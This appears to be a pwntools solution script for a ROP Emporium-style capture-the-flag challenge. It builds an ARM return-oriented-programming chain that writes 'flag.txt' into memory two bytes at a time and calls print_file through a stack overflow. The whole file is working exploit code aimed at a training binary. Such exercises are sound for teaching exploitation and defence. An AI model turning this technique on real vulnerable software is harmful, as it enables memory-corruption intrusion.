from pwn import *

sla = lambda x,y: io.sendlineafter(x,y)
sl = lambda x: io.sendline(x)
sa = lambda x,y: io.sendafter(x,y)
s = lambda x: io.send(x)
ru = lambda x: io.recvuntil(x, drop=True)
r = lambda x: io.recv(numb=x)
rl = lambda: io.recvline(keepends = False)

elf = context.binary = ELF('fluff_armv5-hf', checksec = False)

context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

def start():
    gs = '''
    '''
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    else:
        return process(elf.path)

io = start()

# Gadgets

# 0x00010634 : pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}
pop_all_except_r0_r3 = 0x00010634

# 0x00010638 : strh r0, [r7, #0x1e] ; nop ; lsrs r6, r5, #3 ; movs r1, r0 ; lsrs r4, r4, #3 ; movs r1, r0 ; bx lr

strh_r0_r7_bx_lr = 0x00010638

#   0x000105ec <+0>:	pop	{r0, r1, r3}
#   0x000105f0 <+4>:	bx	r1
pop_r0_r1_r3_bx_r1 = 0x000105ec

#   0x000105f0 <+4>:	bx	r1
bx_r1 = 0x000105f0

# Where to write 'flag.txt' string.
flag = 0x21124 # a random bss writable address

rop = ROP(elf)

# Write 'fl' to &flag
rop.raw(pop_r0_r1_r3_bx_r1)
rop.raw(u16(b'fl'))
rop.raw(pop_all_except_r0_r3) # r1 = next gadget
rop.raw(0x0) # r3 = 0x0 (dosen't really matter)

rop.raw(strh_r0_r7_bx_lr+1) # r1 = strh_r0_r7_bx_lr in thumb mode
rop.raw([0x0]*4) # r2, r4 - r6 = 0x0
rop.raw(flag - 0x1e) # r7 = where to write flag string.
rop.raw([0x0]*2)
rop.raw(pop_r0_r1_r3_bx_r1) # lr = next gadget
rop.raw(bx_r1)

# Write 'ag' to &flag
rop.raw(u16(b'ag'))
rop.raw(pop_all_except_r0_r3) # r1 = next gadget
rop.raw(0x0) # r3 = 0x0 (dosen't really matter)

rop.raw(strh_r0_r7_bx_lr+1) # r1 = strh_r0_r7_bx_lr in thumb mode
rop.raw([0x0]*4) # r2, r4 - r6 = 0x0
rop.raw(flag + 2 - 0x1e) # r7 = where to write flag string.
rop.raw([0x0]*2)
rop.raw(pop_r0_r1_r3_bx_r1) # lr = next gadget
rop.raw(bx_r1)

# Write '.t' to &flag
rop.raw(u16(b'.t'))
rop.raw(pop_all_except_r0_r3) # r1 = next gadget
rop.raw(0x0) # r3 = 0x0 (dosen't really matter)

rop.raw(strh_r0_r7_bx_lr+1) # r1 = strh_r0_r7_bx_lr in thumb mode
rop.raw([0x0]*4) # r2, r4 - r6 = 0x0
rop.raw(flag + 4 - 0x1e) # r7 = where to write flag string.
rop.raw([0x0]*2)
rop.raw(pop_r0_r1_r3_bx_r1) # lr = next gadget
rop.raw(bx_r1)

# Write 'xt' to &flag
rop.raw(u16(b'xt'))
rop.raw(pop_all_except_r0_r3) # r1 = next gadget
rop.raw(0x0) # r3 = 0x0 (dosen't really matter)

rop.raw(strh_r0_r7_bx_lr+1) # r1 = strh_r0_r7_bx_lr in thumb mode
rop.raw([0x0]*4) # r2, r4 - r6 = 0x0
rop.raw(flag + 6 - 0x1e) # r7 = where to write flag string.
rop.raw([0x0]*2)
rop.raw(pop_r0_r1_r3_bx_r1) # lr = next gadget
rop.raw(bx_r1)

rop.raw(flag)
rop.raw(elf.sym.print_file)
rop.raw(0x0) # r3 = 0x0 (doesn't really matter)


exploit = fit({
    32: p32(0xdeadbeef) + rop.chain()
})

io.sendafter(b'> ', exploit)

io.interactive()
